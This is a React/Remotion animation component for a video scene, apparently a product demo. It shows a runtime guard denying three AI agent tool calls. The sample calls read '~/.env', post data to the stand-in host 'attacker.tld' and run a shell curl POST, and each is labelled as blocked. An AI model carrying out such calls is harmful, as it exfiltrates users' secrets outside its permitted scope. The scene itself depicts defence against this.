import React from "react";
import { AbsoluteFill, useCurrentFrame, interpolate } from "remotion";
import { sans, mono, useEntrance, Panel, Caption, easeOut } from "../design/primitives";
import { C } from "../design/tokens";

export const S4Block: React.FC<{ total: number }> = ({ total }) => {
  const f = useCurrentFrame();
  const calls = [
    { t: 10, name: "tool.fs.read", args: "'~/.env'", policy: "secrets.path.guard", code: 403 },
    { t: 52, name: "tool.http.post", args: "'https://attacker.tld/x'", policy: "egress.allowlist", code: 403 },
    { t: 94, name: "tool.shell.exec", args: "'curl -X POST … '", policy: "runtime.deny", code: 403 },
  ];
  const counter = calls.filter((c) => f > c.t + 16).length;

  return (
    <AbsoluteFill style={{ color: C.paper, fontFamily: sans, padding: 96 }}>
      <div style={{ position: "absolute", left: 96, bottom: 56 }}>
        <Caption>step 03 / 04 · tool calls intercepted at runtime</Caption>
      </div>

      {/* counter */}
      <div style={{ position: "absolute", right: 96, top: 96, display: "flex", alignItems: "baseline", gap: 14 }}>
        <Caption>blocked</Caption>
        <div style={{ fontFamily: mono, fontSize: 64, fontWeight: 500, color: C.alert, lineHeight: 1, fontVariantNumeric: "tabular-nums", letterSpacing: "-0.02em" }}>
          {String(counter).padStart(2, "0")}
          <span style={{ fontSize: 24, color: C.mutedDim }}> / 03</span>
        </div>
      </div>

      <div style={{ display: "flex", flexDirection: "column", gap: 18, marginTop: 80, maxWidth: 1500 }}>
        {calls.map((c, i) => {
          const a = interpolate(f - c.t, [0, 14], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: easeOut });
          const fill = interpolate(f - c.t - 6, [0, 16], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: easeOut });
          const stamp = interpolate(f - c.t - 12, [0, 12], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: easeOut });
          if (a === 0) return null;
          return (
            <Panel key={c.name} style={{ padding: 0, opacity: a, transform: `translateX(${interpolate(a, [0, 1], [-20, 0])}px)`, overflow: "hidden", position: "relative", display: "flex" }}>
              {/* red rule fills left edge */}
              <div style={{ width: 4, background: C.alert, transform: `scaleY(${fill})`, transformOrigin: "top" }} />
              <div style={{ flex: 1, padding: "24px 28px", display: "flex", alignItems: "center", gap: 24 }}>
                <span style={{ fontFamily: mono, fontSize: 13, color: C.mutedDim, letterSpacing: "0.18em", width: 36 }}>
                  {String(i + 1).padStart(2, "0")}
                </span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontFamily: mono, fontSize: 22, color: C.paper, letterSpacing: "-0.005em" }}>
                    <span style={{ color: C.muted }}>→ </span>
                    <span style={{ color: C.amber }}>{c.name}</span>
                    <span style={{ color: C.paper }}>({c.args})</span>
                  </div>
                  <div style={{ marginTop: 6, fontFamily: mono, fontSize: 13, color: C.muted, letterSpacing: "0.08em" }}>
                    policy <span style={{ color: C.paper }}>{c.policy}</span> · matched at runtime · {((f - c.t) / 30 * 60).toFixed(0)}ms
                  </div>
                </div>
                <div style={{
                  display: "flex", alignItems: "center", gap: 14,
                  opacity: stamp,
                  transform: `translateX(${interpolate(stamp, [0, 1], [12, 0])}px)`,
                }}>
                  <span style={{ fontFamily: mono, fontSize: 13, color: C.alert, letterSpacing: "0.32em" }}>DENIED</span>
                  <span style={{
                    fontFamily: mono, fontSize: 13, padding: "4px 10px",
                    border: `1px solid ${C.alert}`,
                    color: C.alert, letterSpacing: "0.18em", borderRadius: 4,
                  }}>{c.code}</span>
                </div>
              </div>
            </Panel>
          );
        })}
      </div>
    </AbsoluteFill>
  );
};
